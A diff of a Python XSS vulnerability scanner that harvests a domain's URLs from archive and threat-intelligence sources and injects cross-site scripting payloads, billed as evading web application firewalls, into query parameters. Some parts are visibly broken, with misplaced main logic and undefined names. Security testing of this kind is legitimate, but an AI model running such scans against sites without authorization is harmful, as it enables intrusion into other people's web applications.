+                        failed_payloads.append((payload_url, payload))
+
+                except requests.RequestException as e:
+                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} Request error for {payload_url}: {e}")
+
+        if output_failed_payloads:
+            for payload_url, payload in failed_payloads:
+                print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED}Payload failed: {Style.RESET_ALL} {payload_url}")
+
+        return successful_payloads
+
+    def quit_after_duration(self):
+        time.sleep(self.duration)
+        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Duration of {self.duration} seconds reached. Saving progress and exiting...{Style.RESET_ALL} ")
+        self.stop_scan = True
+        self.finalize_scan()
+        sys.exit(0)
 
     def handle_ctrl_c(self, signum, frame):
-        print("Ctrl+C detected. Stopping the scan.")
+        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Ctrl+C detected. Saving progress and exiting...{Style.RESET_ALL}")
         self.stop_scan = True
+        self.finalize_scan()
+        sys.exit(0)
+
+    def log_event(self, message):
+        try:
+            with open("scan.log", "a") as log_file:
+                log_file.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
+        except OSError as e:
+            print(f"Error writing to log file: {e}")
+
+
+
+    def save_to_text_file(self, vulnerable_urls):
+        """
+        Save a payload URL to a dynamically named text file in the text folder.
+        """
+        try:
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            vulnerable_urls_filename = os.path.join(TEXT_FOLDER, f"vulnerable_urls_{timestamp}.txt")
+            with open(vulnerable_urls_filename, 'a') as file:
+                file.write(vulnerable_urls + "\n")
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Vulnerable URL saved to {vulnerable_urls_filename}")
+        except OSError as e:
+            print(f"Error saving vulnerable URL to text file: {e}")
+
+
+    def save_to_html_file(self, vulnerable_urls):
+        """
+        Save all vulnerable URLs and their payloads to a formatted HTML file.
+        Includes options to download CSV and Excel files for Business Intelligence tools.
+        """
+        try:
+            # Ensure the domain is set
+            if not hasattr(self, 'domain') or not self.domain:
+                self.domain = "Unknown Domain"
+
+            # Create output folders if they do not exist
+            OUTPUT_FOLDER = "reports"
+            HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
+            os.makedirs(HTML_FOLDER, exist_ok=True)
+
+            # Generate dynamic filenames based on current timestamp
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            csv_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.csv")
+            excel_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.xlsx")
+            json_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.json")
+            html_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.html")
+
+            # Save data to CSV, Excel, and JSON files
+            df = pd.DataFrame(vulnerable_urls, columns=["URL", "Payload"])
+            df.to_csv(csv_file, index=False)
+            df.to_excel(excel_file, index=False)
+            df.to_json(json_file, orient="records", lines=True)
+            js_code = '<script>function alert({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeb = '<script>function confirm({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codec = '<script>function eval({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_coded = '<script>function img({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codee = '<script>function src({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codef = '<script>function iframe({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeg = '<script>function javascript({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeh = '<script>function form({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codei = '<script>function a({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codej = '<script>function object({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codek = '<script>function swf({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codel = '<script>function table({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codem = '<script>function div({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_coden = '<script>function td({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeo = '<script>function object type({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codep = '<script>function svg({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeq = '<script>function style({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            # Generate the HTML report
+            with open(html_file, "w") as file:
+                file.write(
+                    f"""
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>XSS Vulnerabilities Report</title>
+                        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+                    {js_code}
+                    {js_codeb}
+                    {js_codec}
+                    {js_coded}
+                    {js_codee}
+                    {js_codef}
+                    {js_codeg}
+                    {js_codeh}
+                    {js_codei}
+                    {js_codej}
+                    {js_codek}
+                    {js_codel}
+                    {js_codem}
+                    {js_coden}
+                    {js_codeo}
+                    {js_codep}
+                    {js_codeq}
+                    </head>
+                    <body>
+                        <div class="container py-5">
+                            <h1 class="text-center text-danger">XSS Vulnerabilities Report</h1>
+                            <p class="text-muted text-center"><strong>Report generated on:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
+                            <p class="text-muted text-center"><strong>Target Domain:</strong> <span class="text-primary">{self.domain}</span></p>
+                            
+                            <div class="mb-4">
+                                <h2>Summary</h2>
+                                <div class="row">
+                                    <div class="col-md-6">
+                                        <p><strong>Total Links Audited:</strong> <span class="text-primary">{len(self.url_list)}</span></p>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <p><strong>Total Vulnerabilities Found:</strong> <span class="text-danger">{len(vulnerable_urls)}</span></p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h2 class="mt-4">Vulnerable URLs</h2>
+                            <table class="table table-bordered table-striped table-hover">
+                                <thead class="table-dark">
+                                    <tr>
+                                        <th>#</th>
+                                        <th>URL</th>
+                                        <th>Payload</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                    """
+                )
+
+                # Add table rows for each vulnerability
+                for idx, (payload_url, payload) in enumerate(vulnerable_urls, start=1):
+                    sanitized_url = html.escape(payload_url)  # Escape the URL
+                    sanitized_payload = sanitize_payload(payload)  # Sanitize the payload
+                    file.write(
+                        f"""
+                        <tr>
+                            <td>{idx}</td>
+                            <td>{sanitized_url}</td>
+                            <td>{sanitized_payload}</td>
+                        </tr>
+                        """
+                    )
+
+                # Add download links and close HTML tags
+                file.write(
+                    f"""
+                                </tbody>
+                            </table>
+
+                            <div class="mt-4">
+                                <h3>Download Options</h3>
+                                <a href="{os.path.basename(csv_file)}" class="btn btn-primary">Download CSV</a>
+                                <a href="{os.path.basename(excel_file)}" class="btn btn-success">Download Excel</a>
+                                <a href="{os.path.basename(json_file)}" class="btn btn-warning">Download JSON</a>
+                            </div>
+                        </div>
+                    </body>
+                    </html>
+                    """
+                )
+
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HTML report saved to {html_file}")
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] CSV, Excel, and JSON files generated.")
+        except Exception as e:
+            print(f"Error saving to HTML file: {e}")
+
+
+
+    def store_single_vulnerability_in_sqlite(self, url, payload):
+        try:
+            conn = sqlite3.connect('vulnerabilities.db')
+            cursor = conn.cursor()
+            cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
+            conn.commit()
+            conn.close()
+        except sqlite3.Error as e:
+            print(f"Error storing single vulnerability: {e}")
+
+    def finalize_scan(self):
+        if self.vulnerable_urls:
+            # Save the list of vulnerabilities to an HTML report
+            self.save_to_html_file(self.vulnerable_urls)
+
+            # Store vulnerabilities in the SQLite database
+            self.store_vulnerabilities_in_sqlite()
+
+            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Vulnerabilities saved successfully. {Style.RESET_ALL}")
+            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} HTML report, database entries, and other output files have been created. {Style.RESET_ALL}")
+        else:
+            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} No vulnerabilities found to save. {Style.RESET_ALL}")
+            print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Exiting...{Style.RESET_ALL}")
+
+
+
+    def save_extracted_urls(self):
+        try:
+            extracted_urls_filename = f"extracted_url_links_{datetime.now().strftime('%Y-%m-%d')}.txt"
+            with open(extracted_urls_filename, 'w') as file:
+                for url in self.url_list:
+                    file.write(url + "\n")
+            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}Extracted URLs saved to {extracted_urls_filename}")
+        except OSError as e:
+            print(f"Error saving extracted URLs: {e}")
 
     def start(self):
         # Count and display the number of discovered links and parameters
@@ -598,101 +1332,482 @@ class XSSScanner:
         discovered_params = sum(len(parse_qs(urlparse(url).query)) for url in self.url_list)
         print(f"[{current_time}] Discovered {discovered_links} links")
         print(f"[{current_time}] Discovered {discovered_params} parameters")
-        print(f"[{current_time}] Analysing links")
-        print(f"[{current_time}] Analysing parameters")
-        print(f"[{current_time}] Now implementing logic to capture Reflected XSS vulnerabilities")
-        print(f"[{current_time}] Now implementing logic to capture Stored XSS vulnerabilities")
-        print(f"[{current_time}] Now implementing logic to capture Persistent XSS vulnerabilities")
-        print(f"[{current_time}] Now implementing logic to capture any known to unknown XSS vulnerabilities")
-        print(f"[{current_time}] Starting XSS vulnerabilities scan on {discovered_links} links with {discovered_params} parameters")
+        print(f"[{current_time}] Now implementing logic to capture XSS vulnerabilities")
+
+        # Remove duplicates and save extracted URLs
         self.url_list = list(set(self.url_list))
+        self.save_extracted_urls()
+
         with ThreadPoolExecutor(max_workers=int(self.threadNumber)) as executor:
             results = list(executor.map(self.scan_urls_for_xss, self.url_list))
+
+        # Flatten results and store vulnerabilities
         self.vulnerable_urls = [url for sublist in results for url in sublist]
         if self.report_file:
             self.store_vulnerabilities_in_sqlite()
             self.generate_report()
+
         return self.vulnerable_urls
-    
+
+
     def scan_urls_for_xss(self, url, output_failed_payloads=True):
         successful_payloads = []
         failed_payloads = []
+        tested_filenames = set()  # Track tested filenames
 
-        # Define a list of keywords that suggest file-related parameters
-        file_related_keywords = ["file", "path", "image", "jquery.magnific-popup.min", "jquery.magnific-popup", "jquery", "jquery.magnific-popup.min.js", "preloaded-modules.min.js", "download", "preloaded-modules.min", "widget-scripts", "preloaded-modules", "jquery.magnific-popup", "widget-scripts", "jquery.magnific-popup", "preloaded-modules", "widget-scripts", "jquery.magnific-popup", "widget-scripts", "jquery.magnific-popup.min", "preloaded", "preload", "preloaded-modules.min", "jquery.magnific-popup.min"]
-
+        # Parse the URL and extract the filename
         parsed_url = urlparse(url)
+        filename = parsed_url.path
+
+        # Check if the filename has already been tested
+        if filename in tested_filenames:
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Skipping duplicate filename: {filename}")
+            return successful_payloads
+
+        tested_filenames.add(filename)  # Mark filename as tested
+
+        # Parse query parameters
         query_params = parse_qs(parsed_url.query)
 
-        # Initialize variables to keep track of progress
-        links_tested = 0
-        total_links = len(self.url_list)
-        current_link = None
+        # Skip irrelevant parameters (e.g., files, images, etc.)
+        file_related_keywords = ["file", "path", "image", "jquery", "download", "preloaded"]
+        filtered_params = [
+            param for param in query_params if not any(keyword in param.lower() for keyword in file_related_keywords)
+        ]
 
-        # Iterate through query parameters
-        for param, values in query_params.items():
-            if any(keyword in param.lower() for keyword in file_related_keywords):
-                # Skip this parameter, as it's likely related to file handling
-                continue
+        if not filtered_params:
+            print(
+    f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]{Style.RESET_ALL} "  # Timestamp
+    f"{Fore.RED}No valid parameters found{Style.RESET_ALL} in URL: {Fore.CYAN}{url}{Style.RESET_ALL}. "  # Highlighting the 'No valid parameters' and URL
+    f"{Fore.MAGENTA}Testing with advanced heuristics.{Style.RESET_ALL}"  # Highlighting the heuristics testing part
+)
 
-            for payload in xss_payloads:
-                payload_url = f"{url}?{param}={payload}"
-                
-                # Check if it's a different link or testing the same link with a different payload
-                if payload_url != current_link:
-                    current_link = payload_url
-                    print(f"Testing link {links_tested + 1}, remaining of {total_links} discovered: {payload_url}")
-                
+            
+            # Common parameter names and additional ones from heuristics
+            common_params = ['id', 'page', 'url', 'query', 'search', 'ref', 'cat', 'name', 'item', 'file']
+            dummy_payloads = [f"{url}?{param}={payload}" for param, payload in zip(common_params, xss_payloads[:10])]
+            
+            heuristic_results = []
+            for dummy_payload_url in dummy_payloads:
                 try:
-                    response = requests.get(payload_url, verify=False, timeout=10)
+                    response = requests.get(dummy_payload_url, verify=False, timeout=2)
+                    status_code = response.status_code
+                    response_text = response.text.lower()
 
-                    if self.stop_scan:
-                        return successful_payloads, failed_payloads
+                    # Heuristic scoring based on response analysis
+                    score = 0
+
+                    if status_code == 200:
+                        score += 5
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +5")
+
+                    if any(payload.lower() in response_text for payload in xss_payloads[:10]):
+                        score += 10
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload found in response. Score: +10")
+
+                    if "error" in response_text or "invalid" in response_text:
+                        score += 3
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.YELLOW}[Error/Invalid Found]{Style.RESET_ALL} 'Error' or 'Invalid' detected in response. Score: +3")
+
+                    if "query" in response_text or "parameter" in response_text:
+                        score += 5
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.CYAN}[Query/Parameter Found]{Style.RESET_ALL} Query-related keywords detected. Score: +5")
+
+                    if len(response_text) > 1000:
+                        score += 2
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.BLUE}[Long Response]{Style.RESET_ALL} Response length exceeds 1000 characters. Score: +2")
+
+                    heuristic_results.append((dummy_payload_url, score))
+
+                except requests.RequestException as e:
+                    print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for dummy payload {dummy_payload_url}: {e}")
+
+            # Sort by heuristic scores in descending order
+            heuristic_results.sort(key=lambda x: x[1], reverse=True)
+
+            # Test top-scoring candidates
+            for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
+                try:
+                    response = requests.get(test_url, verify=False, timeout=2)
+                    if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
+                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")                        
+                        successful_payloads.append((test_url, "Heuristic Test"))
+                        self.save_to_text_file(test_url)
+                except requests.RequestException as e:
+                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL} during heuristic refinement for {test_url}: {e}")
+
+            return successful_payloads
+
+
+        # Test each payload against the filtered parameters
+        selected_filters = xss_payloads[:self.use_filters]  # Apply the specified number of filters
+        for param in filtered_params:
+            for payload in selected_filters:
+                payload_url = f"{url}?{param}={payload}"
+                try:
+                    response = requests.get(payload_url, verify=False, timeout=2)
 
                     if response.status_code == 200 and payload in response.text:
-                        print(f"Potential XSS vulnerability found in link {links_tested + 1}, remaining of {total_links} discovered: {payload_url}")
-                        successful_payloads.append((payload_url, payload))
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found: {payload_url}")
+                        successful_payloads.append((payload_url, payload))  # Collect successful payloads
                     else:
-                        # Payload did not work, add it to the list of failed payloads
                         failed_payloads.append((payload_url, payload))
-                    
-                    # Increment the links tested counter
-                    links_tested += 1
-
-                except Exception as e:
-                    pass
+                except requests.RequestException as e:
+                    print(f"{Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for {payload_url}: {e}")
 
         if output_failed_payloads:
             for payload_url, payload in failed_payloads:
-                print(f"Payload did not work for link {links_tested}/{total_links}: {payload_url}")
+                print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED}Payload failed: {Style.RESET_ALL} {payload_url}")
 
         return successful_payloads
-        
-    # ... (other methods)
 
-if __name__ == '__main__':
+def remove_duplicate_urls(file_path):
+    try:
+        # Read the file and get unique URLs
+        with open(file_path, 'r') as file:
+            urls = file.readlines()
+            unique_urls = list(set(url.strip() for url in urls))
+            unique_urls.sort()  # Optional: sort for better readability
+        
+        # Write back the unique URLs
+        with open(file_path, 'w') as file:
+            for url in unique_urls:
+                file.write(f"{url}\n")
+        
+        print(f"File '{file_path}' cleaned. {len(unique_urls)} unique entries retained.")
+    except Exception as e:
+        print(f"Error: {e}")
+
+
+def extract_from_sources(domain, want_subdomain, sources):
+    """
+    Extract URLs from specified sources: AlienVault, Wayback Machine, and CommonCrawl.
+    """
+    final_url_list = set()
+    wild_card = "*." if want_subdomain else ""
+
+    # Iterate through the selected sources
+    for source in sources:
+        try:
+            if source.lower() == "alienvault":
+                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from AlienVault...")
+                url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
+                raw_urls = make_get_request(url, "json")
+                if raw_urls and "url_list" in raw_urls:
+                    for url_data in raw_urls["url_list"]:
+                        final_url_list.add(url_data["url"])
+            elif source.lower() == "wayback":
+                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from Wayback Machine...")
+                url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
+                urls_list = make_get_request(url, "json")
+                if urls_list:
+                    for url in urls_list[1:]:  # Skip the header
+                        final_url_list.add(url[0])
+            elif source.lower() == "commoncrawl":
+                print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from CommonCrawl...")
+                api_list = [
+                    "http://index.commoncrawl.org/CC-MAIN-2024-10-index",
+                    "http://index.commoncrawl.org/CC-MAIN-2023-06-index"
+                ]
+                for api in api_list:
+                    url = f"{api}?url={wild_card+domain}/*&fl=url"
+                    raw_urls = make_get_request(url, "text")
+                    if raw_urls and ("No Captures found" not in raw_urls):
+                        urls_list = raw_urls.split("\n")
+                        final_url_list.update(url.strip() for url in urls_list if url.strip())
+            else:
+                print(f"[!] Unknown source: {source}")
+        except Exception as e:
+            print(f"[!] Error fetching from {source}: {e}")
+
+    return list(final_url_list)
+
+
+def save_extracted_urls(url_list):
+    """
+    Save extracted URLs to a dynamically named text file in the text folder.
+    """
+    try:
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        extracted_urls_filename = os.path.join(TEXT_FOLDER, f"extracted_urls_{timestamp}.txt")
+        with open(extracted_urls_filename, 'w') as file:
+            for url in url_list:
+                file.write(url + "\n")
+        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Extracted URLs saved to {extracted_urls_filename}")
+    except OSError as e:
+        print(f"Error saving extracted URLs: {e}")
+
+
+
+def get_arguments():
+    parser = argparse.ArgumentParser(
+        description=r"""\033[94m
+____  ___  _________ _________ .___ _______    _______________________________________________________ __________ 
+\\   \\\/  / /   _____//   _____/ |   |\\      \\  /   _____|______   \\_   _____|_   ___ \\__    ___|_____  \\\\______   \\
+ \\     /  \\_____  \\ \\_____  \\  |   |/   |   \\ \\_____  \\ |     ___/|    __)_/    \\  \\/ |    |   /   |   \\|       _/
+ /     \\  /        \\/        \\ |   /    |    \\/        \\|    |    |        \\     \\____|    |  /    |    \\    |   \\
+/___/\\  \\/_______  /_______  / |___\\____|__  /_______  /|____|   /_______  /\\______  /|____|  \\_______  /____|_  /
+      \\_/        \\/        \\/              \\/        \\/                  \\/        \\/                 \\/       \\/ 
+        XSS Inspector - Advanced URL Processor for Enterprise Security
+        Add-on Version: v.0.0.1 | XSS Core Version: v.0.1
+        Obfuscation Engine: 96 Advanced WAF Filters
+        """,
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+
+    # General Information
+    parser.epilog = "\033[96mDeveloped by Haroon Ahmad Awan | Cyber Zeus | Email: haroon@cyberzeus.pk\033[0m"
+
+    # URL Processing Options
+    url_processing = parser.add_argument_group('\033[96mURL Processing Options\033[0m')
+    url_processing.add_argument(
+        "-i", "--input",
+        dest="input",
+        help="\033[93mSpecify the input file containing URLs for processing.\033[0m",
+        required=False
+    )
+    parser.add_argument(
+        "-o", "--output",
+        dest="output",
+        help="\033[93mSpecify the file path to save processed URLs or vulnerability scan results.\033[0m",
+    )
+
+    url_processing.add_argument(
+        "--php-only",
+        action="store_true",
+        help="\033[93mExtract URLs ending with '.php' only, excluding parameters or queries.\033[0m"
+    )
+    url_processing.add_argument(
+        "--php-query",
+        action="store_true",
+        help="\033[93mExtract URLs with '.php' filenames and include query parameters up to '='.\033[0m"
+    )
+    url_processing.add_argument(
+        "--dedupe-php",
+        action="store_true",
+        help="\033[93mRemove duplicate URLs with '.php' filenames, retaining only unique entries.\033[0m"
+    )
+    url_processing.add_argument(
+        "--dedupe-php-with-id",
+        action="store_true",
+        help="\033[93mRemove duplicate '.php' filenames while retaining their query parameters.\033[0m"
+    )
+    url_processing.add_argument(
+        "--with-id-question-mark",
+        action="store_true",
+        help="\033[93mEnsure '.php' URLs include a '?' when query parameters are present.\033[0m"
+    )
+
+
+    # XSS Inspector Options
+    xss_inspector = parser.add_argument_group('\033[96mXSS Inspector Options\033[0m')
+    xss_inspector.add_argument(
+        "-t", "--thread",
+        dest="thread",
+        type=int,
+        help="\033[93mSet the number of threads for URL testing (default: 50).\033[0m",
+        default=50
+    )
+    xss_inspector.add_argument(
+        "--extract-to-file",
+        dest="extract_to_file",
+        help="\033[93mExtract discovered URLs to a specified text file.\033[0m",
+        default=None
+    )
+    xss_inspector.add_argument(
+        "--use-filters",
+        dest="use_filters",
+        type=int,
+        help="\033[93mLimit the number of WAF filters to be used from the top of the list.\033[0m",
+        default=None
+    )
+    xss_inspector.add_argument(
+        "--skip-duplicate",
+        dest="skip_duplicate",
+        type=int,
+        help="\033[93mIgnore URLs tested more than the specified number of times (default: 10).\033[0m",
+        default=10
+    )
+    xss_inspector.add_argument(
+        "-s", "--subs",
+        dest="want_subdomain",
+        action="store_true",
+        help="\033[93mInclude URLs from subdomains in the scan results.\033[0m"
+    )
+    xss_inspector.add_argument(
+        "--deepcrawl",
+        dest="deepcrawl",
+        action="store_true",
+        help="\033[93mEnable deep crawling using all CommonCrawl APIs (may take additional time).\033[0m"
+    )
+    xss_inspector.add_argument(
+        "--report",
+        dest="report_file",
+        help="\033[93mGenerate a detailed HTML report of the results.\033[0m",
+        default=None
+    )
+    xss_inspector.add_argument(
+        "--sources",
+        dest="sources",
+        help="\033[93mSpecify data sources for crawling (alienvault, wayback, commoncrawl; default: all).\033[0m",
+        default="all"
+    )
+    xss_inspector.add_argument(
+        "--test-links",
+        dest="test_links",
+        help="\033[93mLimit the number of links to test (e.g., 10, 20, 30, or 'all').\033[0m",
+        default="all"
+    )
+    xss_inspector.add_argument(
+        "--duration",
+        dest="duration",
+        type=int,
+        help="\033[93mSpecify the duration (in seconds) to run the scan before stopping.\033[0m"
+    )
+    xss_inspector.add_argument(
+        "--use-extracted-file",
+        dest="use_extracted_file",
+        help="\033[93mUse previously extracted URLs from a specified file.\033[0m",
+        default=None
+    )
+
+    # Mandatory Arguments
+    required_arguments = parser.add_argument_group('\033[91mScan Arguments\033[0m')
+    required_arguments.add_argument(
+        "-l", "--list",
+        dest="url_list",
+        help="\033[91mProvide a file containing a list of URLs (e.g., google_urls.txt).\033[0m",
+        required=False
+    )
+    required_arguments.add_argument(
+        "-d", "--domain",
+        dest="domain",
+        help="\033[91mSpecify the target domain for vulnerability assessment (e.g., testphp.vulnweb.com).\033[0m",
+        required=False
+    )
+
+    return parser.parse_args()
+
+# Main logic
+    # Main logic
+    args = get_arguments()
+
+    try:
+        # Ensure input file is provided
+        if not args.input:
+            raise ValueError("No input file provided. Use the --input option to specify a file.")
+
+        print(f"\033[96mProcessing URLs from:\033[0m {args.input}")
+
+        # Call process_urls with correct arguments
+        processed_urls = processed_urls(
+            input_file=args.input,
+            php_only=args.php_only,
+            php_query=args.php_query,
+            dedupe_php=args.dedupe_php,
+            dedupe_php_with_id=args.dedupe_php_with_id,
+            with_id_question_mark=args.with_id_question_mark,
+            output_file=args.output  # Use 'output_file' as defined in the function signature
+        )
+
+        # Output results
+        if args.output:
+            print(f"\033[92mProcessed URLs saved to {args.output}\033[0m")
+        else:
+            print("\033[92mProcessed URLs:\033[0m")
+            for url in processed_urls:
+                print(url)
+
+    except ValueError as ve:
+        print(f"\033[91mInput Error: {ve}\033[0m")
+        sys.exit(1)
+    except FileNotFoundError:
+        print(f"\033[91mFile not found: {args.input}\033[0m")
+        sys.exit(1)
+    except Exception as e:
+        print(f"\033[91mError during processing: {str(e)}\033[0m")
+        sys.exit(1)
+
+if __name__ == "__main__":
     arguments = get_arguments()
 
-    if arguments.domain:
-        print(f"[{current_time}] Collecting URLs from WaybackMachine, AlienVault OTX, CommonCrawl")
-        crawl = PassiveCrawl(arguments.domain, arguments.want_subdomain, arguments.thread, arguments.deepcrawl)
-        final_url_list = crawl.start()
+    # Check if --extract-to-file is specified
+    if arguments.extract_to_file:
+        if arguments.domain:
+            print(f"[{current_time}] Extracting URLs from selected sources.")
+            sources = arguments.sources.split(",") if arguments.sources.lower() != "all" else ["alienvault", "wayback", "commoncrawl"]
+            extracted_urls = extract_from_sources(arguments.domain, arguments.want_subdomain, sources)
+        elif arguments.url_list:
+            extracted_urls = readTargetFromFile(arguments.url_list)
+        else:
+            print("[!] Please specify either --domain or --list for URL extraction.")
+            sys.exit(1)
+
+        # Save extracted URLs to file
+        save_extracted_urls_to_file(extracted_urls, arguments.extract_to_file)
+        sys.exit(0)
+    
+
+    # Check if the --use-extracted-file option is used
+    if arguments.use_extracted_file:
+        try:
+            final_url_list = readTargetFromFile(arguments.use_extracted_file)
+            print(f"[{current_time}] Loaded {len(final_url_list)} URLs from {arguments.use_extracted_file}")
+        except FileNotFoundError:
+            print(f"[!] Error: File '{arguments.use_extracted_file}' not found.")
+            sys.exit(1)
+    elif arguments.domain:
+        print(f"[{current_time}] Collecting URLs from selected sources.")
+        sources = arguments.sources.split(",") if arguments.sources.lower() != "all" else ["alienvault", "wayback", "commoncrawl"]
+        final_url_list = extract_from_sources(arguments.domain, arguments.want_subdomain, sources)
     elif arguments.url_list:
         final_url_list = readTargetFromFile(arguments.url_list)
     else:
-        print("[!] Please Specify --domain or --list flag ..")
-        print(f"[*] Type: {sys.argv[0]} --help")
+        print(f"[!] Please Specify {sys.argv[0]} --domain or --list or --use-extracted-file")
+        print(f"[*] Type: {sys.argv[0]} --help for extended help")
         sys.exit()
 
-    scan = XSSScanner(final_url_list, arguments.thread, arguments.report_file)  # Create XSSScanner object
-    vulnerable_urls = scan.start()  # Start scanning for XSS vulnerabilities
+    # Deduplicate URLs by filename
+    final_url_list = list({urlparse(url).path: url for url in final_url_list}.values())
 
-    total_links_audited = len(final_url_list)
-    with open('total_links_audited.txt', 'w') as file:
-        file.write(str(total_links_audited))  # Write the total number of links audited to a text file
+    # Limit the links if --test-links is specified
+    final_url_list = limit_links(final_url_list, arguments.test_links)
 
-    print(f"[{current_time}] Total Links Audited: ", total_links_audited)
+    # Initialize scanner with skip-duplicate argument
+    skip_duplicate_limit = int(arguments.skip_duplicate) if arguments.skip_duplicate else 10
+    scan = XSSScanner(
+        url_list=final_url_list,
+        threadNumber=arguments.thread,
+        report_file=arguments.report_file,
+        skip_duplicate=skip_duplicate_limit,
+        use_filters=arguments.use_filters,
+        payload=None,
+        duration=arguments.duration,
+        domain=arguments.domain
+    )
+    
+    # Start scanning and save extracted URLs
+    vulnerable_urls = scan.start()
+    scan.save_extracted_urls()
 
+
+# Log results
+current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+total_links_audited = len(final_url_list)
